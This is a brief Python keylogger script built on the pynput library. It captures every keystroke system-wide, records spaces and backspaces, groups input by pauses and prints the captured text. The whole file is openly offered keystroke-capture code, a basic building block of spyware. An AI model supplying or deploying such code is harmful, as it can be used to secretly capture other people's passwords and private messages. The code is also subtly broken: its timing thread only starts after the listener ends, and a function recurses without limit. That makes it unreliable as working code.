from pynput import keyboard
import time, threading

kelogger_data = []
current_data_pos = 0
has_been_pressed = False
wait_time = 3

def on_press(key):
    global has_been_pressed, kelogger_data
    try:
        if key.vk in range(96,106):
            # numpad numbers 0-9
            formated = str(int(key.vk) - 96)
        else:
            # normal characters
            formated = key.char
    except AttributeError:
        # special keys
        if key == keyboard.Key.space:
            # space
            formated = " "
        elif key == keyboard.Key.backspace:
            # backspace
            formated = "^BSpace^"
        else:
            # others
            return

    if len(kelogger_data) > current_data_pos:
        kelogger_data[current_data_pos] += formated
    else:
        kelogger_data.append(formated)

    has_been_pressed = True
    print(kelogger_data)

def change_current():
    global current_data_pos, has_been_pressed, kelogger_data
    if has_been_pressed == False and len(kelogger_data) > current_data_pos:
        current_data_pos += 1
    has_been_pressed = False
    time.sleep(wait_time)
    change_current()

# keylogger start
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
threading.Thread(target=change_current, daemon=True).start()
